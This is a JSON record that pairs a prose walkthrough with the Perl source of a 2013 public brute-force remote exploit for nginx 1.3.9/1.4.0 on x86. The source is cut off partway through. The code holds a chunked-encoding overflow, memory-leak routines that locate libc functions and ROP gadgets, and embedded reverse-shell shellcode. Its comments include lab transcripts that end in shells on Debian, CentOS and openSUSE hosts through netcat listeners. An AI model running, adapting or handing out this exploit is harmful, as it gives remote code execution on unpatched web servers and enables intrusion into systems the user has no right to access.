[
    {
        "type": "thought",
        "content": "Initial Setup: The script takes four command-line arguments: <target>, <target port>, <reverse IP>, and <reverse port>. These are used to specify the target nginx server, its port, and where to send the reverse shell.\n\nReverse Shell Payload: The script includes a Linux x86 reverse shell payload ($lnxcbsc) encoded in hexadecimal. This payload will execute /bin/sh on the target machine and connect back to the IP and port specified.\n\nVulnerability Check: The script starts by testing if the remote nginx server is vulnerable by sending crafted HTTP requests (HEAD and GET) with a specially crafted chunked Transfer-Encoding header. It checks for a segmentation fault (SEGV) response, indicating potential vulnerability.\n\nFinding Alignment: It attempts to find the correct alignment distance to trigger the vulnerability reliably by incrementally testing different alignment values.\n\nFinding Write Offset: Once vulnerability is confirmed, it determines the exact alignment and then proceeds to find the correct write offset. It searches for addresses of key functions (mmap64, memset, and ioctl) within the nginx process memory.\n\nExploitation: After finding the necessary offsets and alignments, the script constructs a payload that exploits the vulnerability to write the reverse shell payload into the nginx process memory and execute it.\n\nReverse Shell Handling: Finally, it sets up a listener on the specified IP and port (nc -v -l -p <reverse port>) to catch the reverse shell connection from the exploited nginx server."
    },
    {
        "type": "execution",
        "content": "#nginx 1.3.9/1.4.0 x86 brute force remote exploit\n# copyright (c) 2013 kingcope\n#----------------------------\n#fix for internet exploitation, set MTU:\n#ifconfig <interface> mtu 60000 up\n#\n###\n# !!! WARNING !!! \n# this exploit is unlikely to succeed when used against remote internet hosts.\n# the reason is that nginx uses a non-blocking read() at the remote connection,\n# this makes exploitation of targets on the internet highly unreliable.\n# (it has been tested against a testbed on the internet but I couldn't exploit\n# any other box with it. required was the above ifconfig setting on the client.\n# maybe enabling large tcp frame support on a gigabit connection is more\n# useful)\n# so use it inside intranets only (duh!), this remains a PoC for now :D\n# The exploit does not break stack cookies but makes use of a reliable method\n# to retrieve all needed offsets for Linux x86 and pop a shell.\n###\n#TODO\n#*cleanup code\n#*implement stack cookie break and amd64 support\n#*support proxy_pass directive\n###\n=for comment\nTARGET TESTS (Debian, Centos, OpenSuSE)\n\n1. Debian 7\nperl ngxunlock.pl 192.168.27.146 80 192.168.27.146 443\nTesting if remote httpd is vulnerable % SEGV %\nYES %\nFinding align distance (estimate)\ntesting 5250 align  % SEGV %\ntesting 5182 align  % SEGV %\nVerifying align\nFinding align distance (estimate)\ntesting 5250 align  % SEGV %\ntesting 5182 align  % SEGV %\nFinding write offset, determining exact align\ntesting 0x08049c50, 5184 align  % SURVIVED %\nExtracting memory \\\nbin search done, read 20480 bytes\nexact align found 5184\nFinding exact library addresses\ntrying plt 0x08049a32, got 0x080bc1a4, function 0xb76f4a80  % FOUND exact ioctl 0x08049a30 %\ntrying plt 0x08049ce2, got 0x080bc250, function 0xb773e890  % FOUND exact memset 0x08049ce0 %\ntrying plt 0x08049d52, got 0x080bc26c, function 0xb76f8d40  % FOUND exact mmap64 0x08049d50 %\nFound library offsets, determining mnemonics\ntrying 0x0804ed2d  % SURVIVED %\nexact large pop ret 0x0804a7eb\nexact pop x3 ret 0x0804a7ee\nbin search done |\nSee reverse handler for success\n\nnc -v -l -p 443\nlistening on [any] 443 ...\n192.168.27.146: inverse host lookup failed: Unknown host\nconnect to [192.168.27.146] from (UNKNOWN) [192.168.27.146] 34778\nuname -a;id;\nLinux dakkong 3.2.0-4-686-pae #1 SMP Debian 3.2.46-1 i686 GNU/Linux\nuid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\ncat /etc/debian_version\n7.1\n\n2. CentOS 6.4\nperl ngxunlock.pl 192.168.27.129 80 192.168.27.129 443\nTesting if remote httpd is vulnerable % SEGV %\nYES %\nFinding align distance (estimate)\ntesting 5250 align  % SEGV %\ntesting 5194 align  % SEGV %\nVerifying align\nFinding align distance (estimate)\ntesting 5250 align  % SEGV %\ntesting 5194 align  % SEGV %\nFinding write offset, determining exact align\ntesting 0x08049990, 5200 align  % SURVIVED %\nExtracting memory /\nbin search done, read 20480 bytes\nexact align found 5200\nFinding exact library addresses\ntrying plt 0x080499f2, got 0x080b31ac, function 0x0094a6b0  % FOUND exact memset 0x080499f0 %\ntrying plt 0x08049b52, got 0x080b3204, function 0x008f1fd0  % FOUND exact ioctl 0x08049b50 %\ntrying plt 0x08049f12, got 0x080b32f4, function 0x008f72c0  % FOUND exact mmap64 0x08049f10 %\nFound library offsets, determining mnemonics\ntrying 0x0804e9d4  % SURVIVED %\nexact large pop ret 0x0806194d\nexact pop x3 ret 0x0804a832\nbin search done /\nSee reverse handler for success\n\nnc -v -l 443\nConnection from 192.168.27.129 port 443 [tcp/https] accepted\nuname -a;id;\nLinux localhost.localdomain 2.6.32-358.el6.i686 #1 SMP Thu Feb 21 21:50:49 UTC 2013 i686 i686 i386 GNU/Linux\nuid=99(nobody) gid=99(nobody) groups=99(nobody) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\ncat /etc/redhat*\nCentOS release 6.4 (Final)\n\n3. OpenSuSE 12.1\nperl ngxunlock.pl 192.168.27.135 80 192.168.27.135 443\nTesting if remote httpd is vulnerable % SEGV %\nYES %\nFinding align distance (estimate)\ntesting 5250 align  % SEGV %\ntesting 5182 align  % SEGV %\nVerifying align\nFinding align distance (estimate)\ntesting 5250 align  % SEGV %\ntesting 5182 align  % SEGV %\nFinding write offset, determining exact align\ntesting 0x08049a18, 5184 align  % SURVIVED %\nExtracting memory \\\nbin search done, read 20480 bytes\nexact align found 5184\nFinding exact library addresses\ntrying plt 0x08049a6a, got 0x080be08c, function 0xb75f74f0  % FOUND exact memset 0x08049a68 %\ntrying plt 0x08049b8a, got 0x080be0d4, function 0xb764b160  % FOUND exact ioctl 0x08049b88 %\ntrying plt 0x08049eea, got 0x080be1ac, function 0xb76501e0  % FOUND exact mmap64 0x08049ee8 %\nFound library offsets, determining mnemonics\ntrying 0x0804ea7f  % SURVIVED %\nexact large pop ret 0x0804a7fa\nexact pop x3 ret 0x0804a101\nbin search done -\nSee reverse handler for success\n\nConnection from 192.168.27.135 port 443 [tcp/https] accepted\nuname -a;id;\nLinux linux-01xg 3.1.0-1.2-desktop #1 SMP PREEMPT Thu Nov 3 14:45:45 UTC 2011 (187dde0) i686 i686 i386 GNU/Linux\nuid=65534(nobody) gid=65533(nobody) groups=65533(nobody),65534(nogroup)\n\ncat /etc/SuSE-*\nopenSUSE\nVERSION = 12.1\nopenSUSE 12.1 (i586)\nVERSION = 12.1\nCODENAME = Asparagus\n=cut\n\nuse IO::Socket;\n\nif ($#ARGV < 3) {\nprint \"nginx remote exploit\\n\";\nprint \"copyright (c) 2013 kingcope\\n\";\nprint \"usage: $0 <target> <target port> <reverse ip> <reverse port>\\n\";\nexit;\n}\n\n$target = $ARGV[0];\n$targetport = $ARGV[1];\n$cbip = $ARGV[2];\n$cbport = $ARGV[3];\n\n#linux reverse shell by bighawk\n$lnxcbsc =\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x46\\xcd\\x80\\x90\\x90\\x90\\x6a\\x66\\x58\\x6a\\x01\\x5b\"   \n.\"\\x31\\xc9\\x51\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x68\"\n.\"\\x7f\\x7f\\x7f\\x7f\" # IP\n.\"\\x66\\x68\" . \"\\xb0\\xef\" # PORT\n.\"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\x89\\xc6\\x6a\\x03\\x5b\\x6a\\x66\"\n.\"\\x58\\xcd\\x80\\x87\\xf3\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x31\\xd2\"   \n.\"\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80\";\n\n($a1, $a2, $a3, $a4) = split(//, gethostbyname(\"$cbip\"));\nsubstr($lnxcbsc, 31, 4, $a1 . $a2 . $a3 . $a4);\n\n($p1, $p2) = split(//, reverse(pack(\"s\", $cbport)));\n$p1 = chr(ord($p1));\n$p2 = chr(ord($p2));\nsubstr($lnxcbsc, 37, 2, $p1 . $p2);\n\n$|=1;\n$uri=\"\";\n###test target vulnerable\n#XXX\n#$k = 0x80498d0;\n#$align2 = 5200;\n#$alignplus=0;\n#goto debug;\n=pod\nprint \"Testing if remote httpd is vulnerable \";\n$uritested = 0;\ntest:\ngoto l;\nconnecterr:\nif ($j==0) {\n\tprint \"\\nDestination host unreachable\\n\";\n\texit;\n}\ngoto again;\nl:\nfor ($j=0;$j<15;$j++) {\nagain:\n\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n                                  PeerPort => $targetport,\n                                  Proto    => 'tcp') || {goto connecterr};                                  \n\t\tsetsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n\t\t$req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n                   .\"Connection: close\\r\\n\"\n                   .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n\t\t$req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n\t\t$stack = pack(\"V\", 0xc0debabe);\n\t\ttwinkle();\t\t\n\t\tprint $sock $req;\n\t\tsend($sock, \"A\" x (5555-1024) . $stack, MSG_OOB);\n                $l = read($sock, $buffer, 0x10);\n\t\tclose($sock);\n\t\ttwinkle();\n\n\t\tif ($buffer =~ /HTTP\\/1.1/) {\n\t\t\tnext;\n\t\t}\n\t\tif ($l <= 0) {\n\t\t\tprint \"% SEGV %\\n\";\n\t\t\tprint \"YES %\\n\";\n\t\t\tgoto yes;\n\t\t}\t\n}\n\nif ($uritested == 0) {\n\t$uri = \"50x.html\";\n\t$uritested=1;\n\tgoto test;\n}\nprint \"\\n\\\\\\\\ NO %\\n\";\nprint \"\\\\\\\\ Try to increase client MTU with ifconfig <interface> mtu 60000 up\\n\\n\\\\\\\\ Debug output\\n\";\n$sock = IO::Socket::INET->new(PeerAddr => $target,\n                              PeerPort => $targetport,\n                              Proto    => 'tcp') || {goto connecterr};                                  \nsetsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n$req = \"GET / HTTP/1.1\\r\\nHost: $target\\r\\n\"\n      .\"Connection: keep-alive\\r\\n\"\n      .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n$req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n$stack = pack(\"V\", 0xc0debabe);\nprint $sock $req;\nsend($sock, \"A\" x (5555-1024) . $stack, MSG_OOB);\n$line = 0;\nwhile(<$sock>) {\n\tprint;\n\tif ($line > 30) {\n\t\tlast;\n\t}\n}\nexit;\n###find align\n$verifyalign = 0;\n=cut\nyes:\nprint \"Finding align distance (estimate)\\n\";\nfor ($align=4050;$align<6000;$align+=100) {\nfor ($j=0;$j<15;$j++) {\n\t\tprintf(\"testing %d align \",$align); \nagain0_1:\n#\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n #                                 PeerPort => $targetport,\n  #                                Proto    => 'tcp') || {goto again0_1};\n#\t\tsetsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n#\t\t$req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n #                  .\"Connection: close\\r\\n\\r\\n\";\n#\t\tprint $sock $req;\n#\t\tclose($sock);\n\n\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n                                  PeerPort => $targetport,\n                                  Proto    => 'tcp') || {goto again0_1};\n\t\tsetsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n\t\t$req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n                   .\"Connection: keep-alive\\r\\n\"\n                   .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n\t\t$req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n\t\t$stack = pack(\"V\", 0xc0debabe);\n\t\tprint $sock $req;\n\t\tsend($sock, \"A\" x ($align-1024) . $stack, MSG_OOB);\n                $l = read($sock, $buffer, 0x10);\n\t\ttwinkle();\n\t\tclose($sock);\n\t\t\n\t\tif ($l <= 0) {\n\t\t\tif ($align == 4050) {\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tprint \" % SEGV %\\n\";\n\t\t\t$alignstart = $align-100;\n\t\t\tgoto incalign;\n\t\t}\n\t\tprint \"\\r\\r\\r\\r\";\n\t\tif ($buffer =~ /HTTP\\/1.1/) {\n\t\t\tnext;\n\t\t}\n       \tclose($sock);\n}\n}\nout:\nprint \"\\n\\\\\\\\ Align not found\\n\";\nexit;\n\nincalign:\nfor ($align=$alignstart;$align<6000;$align++) {\nfor ($j=0;$j<7;$j++) {\n\t\tprintf(\"testing %d align \",$align); \nagain0_2:\n#\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n #                                 PeerPort => $targetport,\n  #                                Proto    => 'tcp') || {goto again0_2};\n#\t\tsetsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n#\t\t$req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n #                  .\"Connection: close\\r\\n\\r\\n\";\n#\t\tprint $sock $req;\n#\t\tclose($sock);\n\n\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n                                  PeerPort => $targetport,\n                                  Proto    => 'tcp') || {goto again0_2};\n\t\tsetsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n\t\t$req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n                   .\"Connection: keep-alive\\r\\n\"\n                   .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n\t\t$req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n\t\t$stack = pack(\"V\", 0xc0debabe);\n\t\tprint $sock $req;\n\t\tsend($sock, \"A\" x ($align-1024) . $stack, MSG_OOB);\n        $l = read($sock, $buffer, 0x10);\n\t\ttwinkle();\n\t\tclose($sock);\n\t\tif ($l <= 0) {\n\t\t\tprint \" % SEGV %\\n\";\n\t\t\tif ($verifyalign == 0) {\n\t\t\t\tprint \"Verifying align\\n\";\n\t\t\t\t$verifyalign = $align;\n\t\t\t\tgoto yes;\n\t\t\t}\n\n\t\t\tif (($align > $verifyalign + 4) || ($align < $verifyalign - 4))  {\n\t\t\t\tprint \"\\\\\\\\ Align and verfied align do not match\\n\";\n\t\t\t\texit;\n\t\t\t}\n\n\t\t\tif ($verifyalign < $align) {\n\t\t\t\t$align = $verifyalign;\n\t\t\t}\n\n\t\t\tgoto begin;\n\t\t}\n\t\tprint \"\\r\\r\\r\\r\";\n\n\t\tif ($buffer =~ /HTTP\\/1.1/) {\n\t\t\tnext;\n\t\t}\n       \tclose($sock);\n}\n}\nprint \"\\n\\\\\\\\ could not find align value. bailing out\";\nexit;\n###find write offset\nbegin:\nprint \"Finding write offset, determining exact align\\n\";\n$align2 = $align;\n$ok = 0;\n#for ($k=0x8049d30;$k<=0x0804FFFF;$k+=4) {\nfor ($k=0x08049800;$k<=0x0804FFFF;$k+=4) {\n#for ($k=0x0804dc00;$k<=0x0804FFFF;$k+=4) {\t\nfor ($alignplus=0;$alignplus<7;$alignplus++) {\ndebug:\nfor ($j=0;$j<10;$j++) {\n\t\tif (pack(\"V\", $k) =~ /\\x20/) {\n\t\t\tnext;\n\t\t}\n\t\t$align = $align2 + $alignplus;\n\t\tprintf(\"testing 0x%08x, %d align \",$k,$align); \nagain1:\n#\t\tif ($ok==0) {\n#\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n #                                 PeerPort => $targetport,\n  #                                Proto    => 'tcp') || {goto again1};\n#\t\tsetsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n#\t\t$req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n #                  .\"Connection: close\\r\\n\\r\\n\";\n#\t\tprint $sock $req;\n#\t\tclose($sock);\n#\t\t}\n\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n                                  PeerPort => $targetport,\n                                  Proto    => 'tcp') || {goto again1};\n\t\tsetsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n\t\t$req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n                   .\"Connection: keep-alive\\r\\n\"\n                   .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n\t\t$req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n#\t\t$k = 0x8049e30; #XXX\n\t\t$stack = pack(\"V\", $k) # write plt assumed,eg 0x804ab6c\n\t\t\t\t. \"ZZZZ\" # crash dummy\n\t\t\t\t. \"\\x03\\x00\\x00\\x00\" # write file descriptor\n\t\t\t\t. pack(\"V\", $k-0x1000) # write buffer\n\t\t\t\t. \"\\xff\\xff\\xf0\\x00\"; # write size\n\t\t#$p = <stdin>;\n\t\tprint $sock $req;\n\t\tif ($ok == 0) {\n\t\tsend($sock, \"A\" x ($align-1024) . $stack . \"A\" x 1000, MSG_OOB);\n\t\t} else {\n\t\tsend($sock, \"A\" x ($align-1024) . $stack . \"A\" x 500, MSG_OOB);\n\t\t}\n\t\t$l = read($sock, $buffer, 0x5000);\n\t\ttwinkle();\n\t\tclose($sock);\n#0x8049c50\n\n\t\tif ($buffer =~ /HTTP\\/1.1/) {\n\t\t\tif ($ok == 0) {\n\t\t\t\tprint \"\\r\\r\\r\\r\";\n\t\t\t\tnext;\n\t\t\t} else {\n\t\t\t\tgoto again1;\n\t\t\t}\n\t\t}\n\n\t\tif ($ok == 1 && length($buffer) < 0x2000) {\n\t\t\tgoto again1;\n\t\t}\n\n\t\tif (length($buffer) > 350) {\n\t\t\tif ($ok == 0) {\n\t\t\t\t$ok = 1;\n\t\t\t\tprint \" % SURVIVED %\\n\";\n\t\t\t\tprint(\"Extracting memory \");\n\t\t\t\tgoto again1;\n\t\t\t}\t\t\t\n\t\t\tprint \"\\nbin search done, \";\n\t\t\tprintf(\"read %d bytes\\n\", $l); \n\t\t\tgoto hit;\n\t\t}\t\t           \n\t\tprint \"\\r\\r\\r\\r\";\n}\n}\n}\t\nprint \"\\n\\\\\\\\unable to get write offset\\n\";\nexit;\nhit:\nprintf(\"exact align found %d\\n\", $align);\nprint \"Finding exact library addresses\\n\";\n$write = $k;\n$writeless = $write-0x1000;\n### find offsets for mmap64, memset and ioctl\n$mmap64 = \"\";\n$ioctl = \"\";\n$memset = \"\";\n$mmap64_prefix =\n\"\\x55\\x53\\x56\\x57\\x8b\\x54\\x24\\x28\"\n.\"\\x8b\\x4c\\x24\\x2c\\xf7\\xc2\\xff\\x0f\"\n.\"\\x00\\x00\\x75\";\n$ioctl_prefix =\n\"\\x53\\x8b\\x54\\x24\\x10\\x8b\\x4c\\x24\"\n.\"\\x0c\\x8b\\x5c\\x24\\x08\\xb8\\x36\\x00\"\n.\"\\x00\\x00\";\n$memset_prefix =\n\"\\x53\\x8b\\x4c\\x24\\x10\\x0f\\xb6\\x44\"\n.\"\\x24\\x0c\\x88\\xc4\\x89\\xc2\\xc1\\xe0\"\n.\"\\x10\\x09\\xd0\\x8b\\x54\\x24\\x08\\x83\";\n$memset_prefix2 =\n\"\\xfc\\x57\\x8b\\x54\\x24\\x08\\x8b\\x4c\"\n.\"\\x24\\x10\\x0f\\xb6\\x44\\x24\\x0c\\xe3\"\n.\"\\x2c\\x89\\xd7\\x83\\xe2\\x03\\x74\\x11\";\n$memset_prefix3 =\n\"\\x57\\x8b\\x7c\\x24\\x08\\x8b\\x54\\x24\"\n.\"\\x10\\x8a\\x44\\x24\\x0c\\x88\\xc4\\x89\"\n.\"\\xc1\\xc1\\xe0\\x10\\x66\\x89\\xc8\\xfc\";\n$memset_prefix4 =\n\"\\x55\\x89\\xe5\\x57\\x56\\x83\\xec\\x04\".\n\"\\x8b\\x75\\x08\\x0f\\xb6\\x55\\x0c\\x8b\".\n\"\\x4d\\x10\\x89\\xf7\\x89\\xd0\\xfc\\x83\";\n\n$buffer2 = $buffer;\n$buffer3 = $buffer;\nplt_again:\n$buffer2 = $buffer3;\nfor(;;) {\n\t$i = index($buffer2, \"\\xff\\x25\");\n\tif ($i >= 0) {\n\t\tif (($j = index($buffer3, substr($buffer2, $i, 50))) <= 0) {\n\t\t\t$buffer2 = substr($buffer2, $i+2);\n\t\t\tnext;\n\t\t}\n\t\t$buffer2 = substr($buffer2, $i+2);\n\t\t$address = $writeless + $j;\n\t\t### delve into library function\n\t\tprintf \"trying plt 0x%08x, \", ($address+2);\nagain2:\n\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n\t\t                          PeerPort => $targetport,\n\t\t                          Proto    => 'tcp') || {goto again2};\n                setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n                $req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n                   .\"Connection: keep-alive\\r\\n\"\n                   .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n                $req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n\t\t\t\t$stack = pack(\"V\", $write) # write plt\n\t\t\t\t. \"ZZZZ\" # crash dummy\n\t\t\t\t. \"\\x03\\x00\\x00\\x00\" # write file descriptor\n\t\t\t\t. pack(\"V\", $address+2) # write buffer\n\t\t\t\t. \"\\x00\\x03\\x00\\x00\"; # write size\n                print $sock $req;\n\t\tsend($sock, \"A\" x ($align-1024) . $stack . \"A\" x 1000, MSG_OOB);\t\t\n\n                $l = read($sock, $buffer, 0x300);\n                if ($buffer =~ /HTTP\\/1.1/) {\n                        goto again2;\n                }\n                if ($l == 0x300) {\n\t\t\t$gotentry = unpack(\"V\", substr($buffer,0,4));\n\t\t\tif ($gotentry == 0) {\n\t\t\tprint \"\\r\\r\\r\\r\";\n\t\t\tnext;\n\t\t\t}\n                        close($sock);\n                } else {\n\t\t\tclose($sock);\n\t\t\tgoto again2;\n\t\t}\n\t\t\t\t\n\t\tprintf \"got 0x%08x, \", $gotentry;\nagain3:\n\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n\t\t                          PeerPort => $targetport,\n\t\t                          Proto    => 'tcp') || {goto again3};\n\n                setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n                $req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n                   .\"Connection: keep-alive\\r\\n\"\n                   .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n                $req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n\t\t$stack = pack(\"V\", $write) # write plt\n\t\t\t\t. \"ZZZZ\" # crash dummy\n\t\t\t\t. \"\\x03\\x00\\x00\\x00\" # write file descriptor\n\t\t\t\t. pack(\"V\", $gotentry) # write buffer\n\t\t\t\t. \"\\x00\\x03\\x00\\x00\"; # write size\n                print $sock $req;\n\t\tsend($sock, \"A\" x ($align-1024) . $stack . \"A\" x 1000, MSG_OOB);\t\t\n\n                $l = read($sock, $buffer, 0x300);\n\t\tclose($sock);\n                if ($buffer =~ /HTTP\\/1.1/) {\n\t\t\tgoto again3;\n                }\n                if ($l == 0x300) {\n\t\t\t$function = unpack(\"V\", substr($buffer,0,4));\n                } else {\n\t\t\tgoto again3;\n\t\t}\n\t\tif ($function == 0) {\n\t\tprint \"\\r\\r\\r\\r\";\n\t\tnext;\n\t\t}\n\n\t\tprintf \"function 0x%08x \", $function;\nagain4:\n\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n\t\t                          PeerPort => $targetport,\n\t\t                          Proto    => 'tcp') || {goto again4};\n\n                setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n                $req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n                   .\"Connection: keep-alive\\r\\n\"\n                   .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n                $req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n\t\t$stack = pack(\"V\", $write) # write plt\n\t\t\t\t. \"ZZZZ\" # crash dummy\n\t\t\t\t. \"\\x03\\x00\\x00\\x00\" # write file descriptor\n\t\t\t\t. pack(\"V\", $function) # write buffer\n\t\t\t\t. \"\\xff\\xff\\xf0\\x00\"; # write size\n                print $sock $req;\n\t\tsend($sock, \"A\" x ($align-1024) . $stack . \"A\" x 1000, MSG_OOB);\t\t\n\n                #$p = <stdin>;\n                $l = read($sock, $buffer, 0x500);\n                close($sock);\n                if ($buffer =~ /HTTP\\/1.1/) {\n\t\t\tgoto again4;\n                }\n                if ($l != 0x500) {\n\t\t\tgoto again4;\n\t\t}\n\t\t###\t\t\n\t\t\n\t\tif (substr($buffer, 0, length($mmap64_prefix)) eq\n\t\t\t$mmap64_prefix) {\n\t\t\t$mmap64 = $address;\n\t\t\tprintf(\" %% FOUND exact mmap64 0x%08x %%\\n\", $mmap64);\n\t\t}\n\t\tif ((substr($buffer, 0, length($memset_prefix)) eq\n\t\t\t$memset_prefix) or \n\t\t    (substr($buffer, 0, length($memset_prefix2)) eq\n\t\t\t $memset_prefix2) or\n\t\t    (substr($buffer, 0, length($memset_prefix3)) eq\n\t\t\t $memset_prefix3) or\n\t\t    (substr($buffer, 0, length($memset_prefix4)) eq\n\t\t\t $memset_prefix4)) {\n\t\t\t$memset = $address;\n\t\t\tprintf(\" %% FOUND exact memset 0x%08x %%\\n\", $memset);\n\t\t}\n\t\tif (substr($buffer, 0, length($ioctl_prefix)) eq\n\t\t\t$ioctl_prefix) {\n\t\t\t$ioctl = $address;\n\t\t\tprintf(\" %% FOUND exact ioctl 0x%08x %%\\n\", $ioctl);\n\t\t}\n\t\t\n\t\tif (($mmap64 ne \"\") and ($memset ne \"\") and ($ioctl ne \"\")) {\t\t\n\t\t\tgoto gotplt;\n\t\t}\n\t\tprint \"\\r\\r\\r\\r\";\n\t} else {\n\t\tlast;\n\t}\n}\nprint \"\\nFinding exact library addresses\\n\";\ngoto plt_again;\ngotplt:\nprint \"Found library offsets, determining mnemonics\\n\";\n### find pop pop pop ret\n### to set socket blocking\nfor ($k=$write + 0x5000;;$k++) {\n\t\tprintf(\"trying 0x%08x \",$k); \nagain5:\n\t\t$sock = IO::Socket::INET->new(PeerAddr => $target,\n                                  PeerPort => $targetport,\n                                  Proto    => 'tcp') || {goto again5};\n                setsockopt($sock, SOL_SOCKET, SO_SNDBUF, 60000);\n                $req = \"HEAD /$uri HTTP/1.1\\r\\nHost: $target\\r\\n\"\n                   .\"Connection: keep-alive\\r\\n\"\n                   .\"Transfer-Encoding:chunked\\r\\n\\r\\n\";\n                $req .= \"0\" x (1024-length($req)-16) . \"8000000000003770\";\n\t\t\t\t$stack = pack(\"V\", $ioctl)\n\t\t\t\t. pack(\"V\", $k) # pop pop pop ret assumed\n\t\t\t\t. \"\\x03\\x00\\x00\\x00\"\n\t\t\t\t. \"\\x21\\x54\\x00\\x00\"\n\t\t\t\t. \"\\x08\\x80\\x04\\x08\" # null byte\n\t\t\t\t. pack(\"V\", $write) # write plt found\n\t\t\t\t. \"ZZZZ\" # crash dummy\n\t\t\t\t. \"\\x03\\x00\\x00\\x00\" # write file descriptor\n\t\t\t\t. pack(\"V\", $write) # write buffer\n\t\t\t\t. \"\\xff\\xff\\x0f\\x00\"; # write size\n                print $sock $req;\n\t\tsend($sock, \"A\" x ($align-1024) . $stack . \"A\" x 1000, MSG_OOB);\t\t\n\n                #$p = <stdin>;\n\t\t$l = read($sock, $buffer, 0xfffff);\n\t\tclose($sock);\n\t\ttwinkle();\n\t\tif ($buffer =~ /HTTP\\/1.1/) {\n                        again5;\n                }\n\n\t\tif ($l  > 0xfff) {\n\t\t\tprint \" % SURVIVED %\\n\";\n\t\t\tclose($sock);\n\t\t\tgoto hit2;\n\t\t}\n\t\tprint \"\\r\\r\\r\\r\";\n                next;\n}\nhit2:\n###send attack buffer\n###find largepopret\n@matches = $buffer =~ /(\\x83\\xc4\\x20[\\x58\\x5b\\x59\\x5a\\x5e\\x5f\\x5d][\\x58\\x5b\\x59\\x5a\\x5e\\x5f\\x5d][\\x58\\x5b\\x59\\x5a\\x5e\\x5f\\x5d]\\xc3)/g;\nforeach $m (@matches) {\n\t$i = index($buffer, $m);\n\ttwinkle();\n\tprint \"\\r\";\n\tif ($i >= 0) {\n\t\t$__largepopret = $write + $i;\n\t\tprintf(\"exact large pop ret 0x%08x\\n\", $__largepopret);\n\t\tgoto hit3;\n\t}\n}\nprint \"\\\\\\\\ large pop ret not found\\n\";\nexit;\nhit3:\n###find poppoppopret\n@matches = $buffer =~ /([\\x58\\x5b\\x59\\x5a\\x5e\\x5f\\x5d][\\x58\\x5b\\x59\\x5a\\x5e\\x5f\\x5d][\\x58\\x5b\\x59\\x5a\\x5e\\x5f\\x5d]\\xc3)/g;\nforeach $m (@matches) {\n\t$i = index($buffer, $m);\n\tif ($i >= 0) {\n\t\t$__poppoppopret = $write + $i;\n\t\tprintf(\"exact pop x3 ret 0x%08x\\n\", $__poppoppopret);\n\t\tgoto attack;\n\t}\n}\nprint \"\\\\\\\\ poppoppopret not found\\n\";\nexit;\nattack:\t\t\t  \n$largepopret = pack(\"V\", $__largepopret);\n$popblock = \"\\x00\\x00\\x00\\x00\"\n\t   .\"\\x00\\x00\\x00\\x00\"\n\t   .\"\\x00\\x00\\x00\\x00\"\n\t   .\"\\x00\\x00\\x00\\x00\";\n$popret = pack(\"V\", $__poppoppopret+2);\n$poppoppopret = pack(\"V\", $__poppoppopret);\n$pop3ret = $__poppoppopret;\n\n$copycode = \"\\xfc\\x8b\\xf4\\xbf\\x00\\x01\\x00\\x10\\xb9\\x00\\x02\\x00\\x00\\xf3\\xa4\"\n\t\t   .\"\\xeb\\xff\";\n$memsetcode = \"\";\n$copyaddress = 0x10000000;\nfor ($i=0;$i<length($copycode);$i++) {\n\t$byte = substr($copycode, $i, 1);\n\t$memsetcode .= 